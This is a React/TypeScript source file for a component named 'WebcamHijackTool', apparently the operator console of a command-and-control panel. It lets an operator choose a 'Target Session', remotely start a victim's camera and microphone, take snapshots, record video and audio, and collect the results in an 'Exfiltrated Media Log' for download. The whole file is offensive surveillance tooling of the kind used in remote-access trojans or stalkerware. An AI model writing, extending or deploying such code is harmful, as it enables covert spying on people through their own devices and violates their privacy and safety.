
'use client';

import { useState, useRef, useEffect } from 'react';
import { Card, CardHeader, CardTitle, CardDescription, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { Camera, Video, Mic, StopCircle, Download, Image as ImageIcon, Info, Webcam, AudioLines, FileArchive } from 'lucide-react';
import { logActivity } from '@/services/activity-log-service';
import { useAuth } from '@/hooks/use-auth';
import { Badge } from './ui/badge';
import { ScrollArea } from './ui/scroll-area';
import { format } from 'date-fns';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from './ui/select';
import { Label } from './ui/label';
import type { TrackedEvent } from './live-tracker';
import Image from 'next/image';
import { useLocalStorage } from '@/hooks/use-local-storage';

type MediaChunk = {
  id: string;
  sessionId: string;
  dataUrl: string;
  type: 'video' | 'audio' | 'image';
  timestamp: string;
};

type WebcamHijackToolProps = {
    sessions: Map<string, TrackedEvent[]>;
    selectedSessionId: string | null;
    setSelectedSessionId: (id: string | null) => void;
}

export function WebcamHijackTool({ sessions, selectedSessionId, setSelectedSessionId }: WebcamHijackToolProps) {
  const { toast } = useToast();
  const { user } = useAuth();
  
  const [isVideoRecording, setIsVideoRecording] = useState(false);
  const [isAudioRecording, setIsAudioRecording] = useState(false);
  const [isCameraActive, setIsCameraActive] = useState(false);
  const [isMicActive, setIsMicActive] = useState(false);

  const { value: capturedMedia, setValue: setCapturedMedia } = useLocalStorage<MediaChunk[]>('netra-captured-media', []);
  const [liveFeedSrc, setLiveFeedSrc] = useState<string | null>(null);
  
  const hasActiveSession = selectedSessionId && sessions.has(selectedSessionId);
  const channelRef = useRef<BroadcastChannel | null>(null);

  useEffect(() => {
    channelRef.current = new BroadcastChannel('netrax_c2_channel');
    
    const handleMessage = (event: MessageEvent) => {
        if (event.data.type === 'media-stream') {
            const { data, sessionId } = event.data;
            if (data.type === 'image-snapshot' && sessionId === selectedSessionId) {
                setLiveFeedSrc(data.snapshot);
                setIsCameraActive(true);
            } else if (data.type.startsWith('video') || data.type.startsWith('audio') || data.type.startsWith('image')) {
                 const newChunk: MediaChunk = {
                    id: `media-${Date.now()}`,
                    sessionId: sessionId,
                    dataUrl: data.dataUrl,
                    type: data.type.startsWith('video') ? 'video' : data.type.startsWith('image') ? 'image' : 'audio',
                    timestamp: new Date().toISOString()
                };
                setCapturedMedia(prev => [newChunk, ...prev]);
                toast({ title: "Media Captured!", description: `A new ${newChunk.type} file has been received from ${sessionId}.` });
            } else if (data.type === 'status') {
                if (data.message === 'Permissions granted.') {
                    if (sessionId === selectedSessionId) {
                       setIsCameraActive(true);
                       setIsMicActive(true); // Permissions are usually granted together
                    }
                } else {
                    toast({ variant: 'destructive', title: 'Permission Error', description: `Session ${sessionId} reported: ${data.message}`});
                }
            }
        }
    };
    
    channelRef.current.addEventListener('message', handleMessage);

    return () => {
      channelRef.current?.removeEventListener('message', handleMessage);
      channelRef.current?.close();
    };
  }, [selectedSessionId, toast, setCapturedMedia]);

  useEffect(() => {
      // Reset state when session changes
      setLiveFeedSrc(null);
      setIsCameraActive(false);
      setIsMicActive(false);
      setIsVideoRecording(false);
      setIsAudioRecording(false);
  }, [selectedSessionId]);

  const sendCommandToSession = (command: string, options = {}) => {
    if (!selectedSessionId) {
        toast({ variant: 'destructive', title: 'No session selected' });
        return;
    }
    channelRef.current?.postMessage({
        type: 'command',
        sessionId: selectedSessionId,
        command,
        options,
    });
    logActivity({
        user: user?.displayName || 'Operator',
        action: `Sent command: ${command}`,
        details: `Session: ${selectedSessionId}`
    });
  };

  const downloadMedia = (chunk: MediaChunk) => {
    const a = document.createElement('a');
    a.style.display = 'none';
    a.href = chunk.dataUrl;
    const extension = chunk.type === 'image' ? 'png' : chunk.type === 'video' ? 'webm' : 'webm'; // Audio is also often webm
    a.download = `${chunk.type}_${chunk.id}.${extension}`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    toast({ title: "Media downloaded."});
  };

  return (
    <div className="grid md:grid-cols-2 gap-8">
      <div className="space-y-4">
         <div className="space-y-2">
              <Label>Target Session</Label>
               <Select value={selectedSessionId || ''} onValueChange={setSelectedSessionId} disabled={sessions.size === 0}>
                  <SelectTrigger>
                      <SelectValue placeholder="Select an active session..." />
                  </SelectTrigger>
                  <SelectContent>
                      {Array.from(sessions.keys()).map(id => (
                          <SelectItem key={id} value={id}>{id}</SelectItem>
                      ))}
                  </SelectContent>
              </Select>
         </div>
         
          <Card className="bg-primary/10">
              <CardHeader>
                  <CardTitle className="text-lg flex items-center gap-2"><Video className="h-5 w-5"/> Video Feed</CardTitle>
                   {isCameraActive && <Badge variant="destructive" className="w-fit"><Webcam className="mr-2 h-4 w-4"/> LIVE</Badge>}
              </CardHeader>
              <CardContent className="space-y-4">
                  <div className="w-full aspect-video rounded-md bg-black flex items-center justify-center">
                      {liveFeedSrc ? (
                          <Image src={liveFeedSrc} alt="Live feed" width={640} height={480} className="w-full h-full object-contain"/>
                      ) : (
                          <p className="text-muted-foreground">{hasActiveSession ? 'Camera feed is inactive.' : 'Select a session.'}</p>
                      )}
                  </div>
                  <div className="grid grid-cols-2 gap-2">
                      <Button onClick={() => sendCommandToSession('start-video')} disabled={!hasActiveSession || isCameraActive}>Start Camera</Button>
                      <Button onClick={() => sendCommandToSession('capture-image')} disabled={!isCameraActive}>Capture Image</Button>
                      <Button onClick={() => { sendCommandToSession('start-video-record'); setIsVideoRecording(true); }} disabled={!isCameraActive || isVideoRecording}>Start Video Recording</Button>
                      <Button onClick={() => { sendCommandToSession('stop-video-record'); setIsVideoRecording(false); }} disabled={!isCameraActive || !isVideoRecording} variant="destructive">Stop Video Recording</Button>
                  </div>
              </CardContent>
          </Card>

           <Card className="bg-primary/10">
                <CardHeader>
                    <CardTitle className="text-lg flex items-center gap-2"><Mic className="h-5 w-5"/> Audio Feed</CardTitle>
                    {isMicActive && <Badge variant="destructive" className="w-fit"><AudioLines className="mr-2 h-4 w-4"/> LIVE</Badge>}
                </CardHeader>
                <CardContent className="space-y-4">
                     <div className="grid grid-cols-2 gap-2">
                        <Button onClick={() => sendCommandToSession('start-mic')} disabled={!hasActiveSession || isMicActive}>Start Mic</Button>
                        <Button onClick={() => { sendCommandToSession('start-audio-record'); setIsAudioRecording(true); }} disabled={!isMicActive || isAudioRecording}>Start Audio Recording</Button>
                        <Button onClick={() => { sendCommandToSession('stop-audio-record'); setIsAudioRecording(false); }} disabled={!isMicActive || !isAudioRecording} variant="destructive" className="col-span-2">Stop Audio Recording</Button>
                    </div>
                </CardContent>
            </Card>

      </div>
      
      <div className="space-y-4">
          <h3 className="font-semibold text-lg flex items-center gap-2"><FileArchive /> Exfiltrated Media Log</h3>
          <Card className="h-full flex flex-col min-h-[400px]">
              <CardContent className="p-2 flex-grow">
                  <ScrollArea className="h-full max-h-[70vh]">
                      <div className="p-4">
                       {capturedMedia.length === 0 ? (
                          <p className="text-center text-muted-foreground py-16">No media captured yet.</p>
                       ) : (
                          <div className="space-y-3">
                              {capturedMedia.map(chunk => (
                                  <div key={chunk.id} className="flex items-center justify-between p-2 bg-background rounded-md">
                                      <div className="flex items-center gap-3">
                                          {chunk.type === 'image' ? <ImageIcon className="h-5 w-5 text-accent"/> : chunk.type === 'video' ? <Video className="h-5 w-5 text-accent" /> : <Mic className="h-5 w-5 text-accent" />}
                                          <div className="text-xs">
                                              <p className="capitalize font-semibold">{chunk.type} Capture</p>
                                              <p className="text-muted-foreground font-mono" title={chunk.sessionId}>{chunk.sessionId.substring(0,20)}...</p>
                                              <p className="text-muted-foreground">{format(new Date(chunk.timestamp), 'PPpp')}</p>
                                          </div>
                                      </div>
                                      <div className='flex items-center gap-2'>
                                          <Button size="icon" variant="ghost" onClick={() => downloadMedia(chunk)}><Download className="h-4 w-4"/></Button>
                                      </div>
                                  </div>
                              ))}
                          </div>
                       )}
                       </div>
                  </ScrollArea>
              </CardContent>
          </Card>
      </div>
    </div>
  );
}
